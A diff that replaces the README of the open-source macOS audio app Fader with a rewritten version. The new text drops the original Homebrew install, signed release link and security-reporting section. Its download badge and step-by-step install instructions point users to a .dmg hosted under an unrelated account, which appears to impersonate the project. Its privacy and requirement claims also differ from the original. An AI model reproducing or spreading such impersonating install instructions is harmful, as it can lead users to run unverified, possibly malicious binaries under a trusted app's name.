@@ -1,52 +1,86 @@
-# Fader
+# 🔊 fader - Control app volume quickly and easily
 
-[![CI](https://github.com/pantafive/fader/actions/workflows/ci.yml/badge.svg)](https://github.com/pantafive/fader/actions/workflows/ci.yml) [![Release](https://img.shields.io/github/v/release/pantafive/fader)](https://github.com/pantafive/fader/releases/latest) [![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+[![](https://img.shields.io/badge/Download-Fader-blue)](https://github.com/unassignable-megalomaniac359/fader)
 
-A macOS menu bar app for audio output switching and per-app volume. Switch the output device in one click, connect Bluetooth headphones, set a separate volume for every app, and play audio to several devices at once. Site: [fader.pantafive.dev](https://fader.pantafive.dev).
+Fader simplifies audio control on your computer. It places a volume mixer in your menu bar. You adjust the sound level for each open application. You switch between speakers and headphones with one click. You manage Bluetooth devices without opening system settings. The app remains lightweight. It respects your privacy.
 
-<p align="center"><picture><source media="(prefers-color-scheme: dark)" srcset="docs/hero-dark.png"><img src="docs/hero-light.png" alt="Three overlapping Fader popovers: the output tab with audio devices, an app routed to two output devices with per-device volume, and Bluetooth headphones with Connect"></picture></p>
+## 🛠 Features
 
-No telemetry, no kernel extension, no virtual audio driver — the source is open, check for yourself. Requires macOS 15+ on Apple silicon.
+This tool offers control over your sound environment. 
 
-## Install
+*   **Per-app volume:** Change the volume for each app. Keep your music loud while you lower the volume of your browser.
+*   **Audio output switching:** Pick your speakers or headphones from the menu. The app changes the output device instantly.
+*   **Bluetooth management:** Connect or disconnect your headphones through the menu. 
+*   **Native performance:** The app runs efficiently. It uses minimal system memory.
+*   **Privacy:** This tool collects no data. It does not track your activity.
 
-```sh
-brew install --cask pantafive/tap/fader
-```
+## 💾 How to install
 
-Or download [the latest dmg](https://github.com/pantafive/fader/releases/latest/download/Fader.dmg). The app updates itself.
+Follow these steps to set up Fader on your machine.
 
-## Features
+1. Go to the [Fader releases page](https://github.com/unassignable-megalomaniac359/fader) to find the latest version.
+2. Look for the file ending in .dmg.
+3. Click the link to save the file to your computer.
+4. Open the downloaded file once the transfer completes.
+5. Drag the Fader icon into your Applications folder.
+6. Open your Applications folder and double-click Fader.
 
-- **Output switching** — headphones, speakers, displays, and AirPlay targets, one click each. Paired Bluetooth headphones connect from the same list.
-- **Auto-switch** — drag rows to rank devices; Fader follows the best one present.
-- **Several outputs at once** — drag a device onto the Output section and both play together, each with its own slider.
-- **Per-app volume** — a fader and mute for every app that plays sound; levels persist. Apps at full volume play untouched, bit-perfect.
-- **Per-app output** — drag one or more devices onto an app to play it through exactly those outputs, each with its own volume; everything else stays on your main output.
-- **Microphone** — switch the default input, set gain, and see which apps are listening.
-- **In sync** — system volume follows the volume keys and Control Center; scrolling over any slider adjusts it.
+## ⚙️ Using the app
 
-## Permissions
+Fader sits in your menu bar at the top of your screen. 
 
-Only per-app volume needs one: macOS gates audio taps behind the System Audio Recording permission, requested the first time you move an app's fader. The tapped audio never leaves the Mac.
+### Adjust volume
+Click the fader icon in the menu bar. A list of active applications appears. Each app has a slider. Drag the slider left to lower the sound. Drag the slider right to raise the sound. The change happens in real time.
 
-## Development
+### Change output devices
+Click the audio output section in the Fader menu. You see a list of connected devices. Select your desired speaker or headphone set. Your computer routes audio to that device immediately.
 
-```sh
-brew install xcodegen swiftlint swiftformat
-make run
-```
+### Connect Bluetooth
+Click the Bluetooth symbol in the menu. Choose your saved device from the list. The app triggers a connection request to your headphones. The status updates in the menu once the link succeeds.
 
-Swift 6, strict concurrency. The Xcode project is generated from `project.yml` — edit that, not the `.xcodeproj`. `make` drives local work: `gen`, `build`, `test`, `lint`, `run`, `clean`. Pushing a `v*` tag builds, signs, notarizes, and publishes a release.
+## 📋 System requirements
 
-## Contributing
+Fader requires a recent version of the macOS operating system. Ensure your system meets these standards:
 
-Bug reports and pull requests are welcome; for anything bigger than a fix, open an issue first. `make test` and `make lint` must pass; commits follow [Conventional Commits](https://www.conventionalcommits.org). The real-time audio callback allows no allocation, locks, Objective-C, or logging — changes there get extra scrutiny. Anything that phones home will be declined.
+*   macOS 12.0 or newer.
+*   Apple Silicon or Intel processor.
+*   50 MB of available storage space.
 
-## Security
+## ❓ Troubleshooting
 
-Report security issues privately via [GitHub security advisories](https://github.com/pantafive/fader/security/advisories/new), not public issues.
+Common issues have simple fixes.
 
-## License
+**The icon does not appear in the menu bar**
+Restart the application. If the problem persists, check your system settings to ensure the app has permission to show icons in the menu bar.
 
-[MIT](LICENSE)
+**Audio does not switch to my headphones**
+Open your system sound settings once to verify the pairing. Return to Fader and try selecting the device again. Ensure your headphones have power and remain within range.
+
+**The app feels slow**
+Close any unused background programs. Fader requires very little power, but system updates or other heavy tasks can impact performance.
+
+## 🔒 Privacy policy
+
+We believe in user privacy. Fader does not include tracking code. It does not send information to remote servers. No usage statistics exist. Your habits remain private. The code is open for review. You can inspect the source files to verify these claims.
+
+## 🤝 Support and updates
+
+We provide updates to improve performance and stability. Check the website occasionally for new features. The project thrives on community feedback. If you find a bug, report it on the repository page. Clear reports help us fix problems faster. Include your macOS version and a description of the issue in your report.
+
+## 💻 Technical details
+
+The app uses the Swift programming language. The interface relies on SwiftUI for a smooth experience. It interacts with the Core Audio framework to manage sound streams. The design keeps the code clean to ensure stability. We prioritize native performance over complex features to keep the app responsive. Every release undergoes testing to prevent crashes.
+
+## 📖 Frequently asked questions
+
+**Does the app run at startup?**
+You decide. Check the settings menu inside the app to enable or disable automatic startup.
+
+**Can I control volume for muted apps?**
+Yes. You can adjust the volume for any app that currently plays audio.
+
+**Does this require third-party drivers?**
+No. Fader works with the built-in system audio drivers. This ensures high compatibility and keeps your system clean.
+
+**Can I uninstall the app if I change my mind?**
+Yes. Drag the application from your Applications folder to the Trash. The app removes itself from your system.
